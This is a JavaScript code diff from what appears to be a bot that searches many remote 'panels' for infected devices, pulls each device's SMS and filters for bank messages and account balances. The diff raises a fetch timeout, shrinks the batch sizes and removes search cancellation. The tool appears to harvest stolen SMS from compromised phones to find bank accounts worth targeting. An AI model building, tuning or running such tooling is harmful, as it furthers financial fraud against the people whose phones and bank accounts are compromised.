@@ -79,7 +79,7 @@ async function fetchDeviceMessages(device, limit = 800) {
   });
   if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
   const ctrl = new AbortController();
-  const timer = setTimeout(() => ctrl.abort(), 6500);
+  const timer = setTimeout(() => ctrl.abort(), 9000);
   try {
     const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
       signal: ctrl.signal,
@@ -158,50 +158,30 @@ export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, e
   return lines.join('\n');
 }
 
-function emptySearchResult(panels, panelsHit, t0, opts, tier) {
-  const elapsed = Date.now() - t0;
-  return {
-    results: [],
-    text: buildSearchHeader(opts, tier) + '\n\n⛔ Search cancelled\n',
-    stats: { devices: 0, sms: 0, panelsHit: panelsHit.size, scanned: 0, withBankSms: 0 },
-    elapsed,
-    tier,
-    opts,
-    aborted: true,
-  };
-}
-
-export async function runSearch(panels, opts, onProgress, shouldAbort = () => false) {
+export async function runSearch(panels, opts, onProgress) {
   const tier = TIERS[opts.tier] || TIERS.low_high;
   const t0 = Date.now();
   const panelsHit = new Set();
 
   let devices = await fetchAllPanels(panels, {
-    batch: 60,
+    batch: 45,
     onProgress: (done, total, count) => {
-      if (shouldAbort()) return;
       onProgress?.({ phase: 'panels', done, total, count });
     },
   });
-
-  if (shouldAbort()) {
-    return emptySearchResult(panels, panelsHit, t0, opts, tier);
-  }
 
   devices.forEach(d => panelsHit.add(d.panelUrl?.toLowerCase()));
 
   devices = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
   const results = [];
-  const batch = 48;
+  const batch = 28;
   const limit = smsLimitForDays(opts.days);
   let scanned = 0;
 
   for (let i = 0; i < devices.length; i += batch) {
-    if (shouldAbort()) break;
     const chunk = devices.slice(i, i + batch);
     await Promise.all(
       chunk.map(async d => {
-        if (shouldAbort()) return;
         try {
           const data = await fetchDeviceMessages(d, limit);
           const r = processBankMessages(data, opts.days);
@@ -266,6 +246,6 @@ export function searchHelpText() {
     '→ Low/High · ▶ Start\n\n' +
     'Quick (no taps): `/search avl/bal, bank online now`\n' +
     '🏦 `/searchbank`\n' +
-    '/done = beech mein cancel'
+    '/done = cancel'
   );
 }
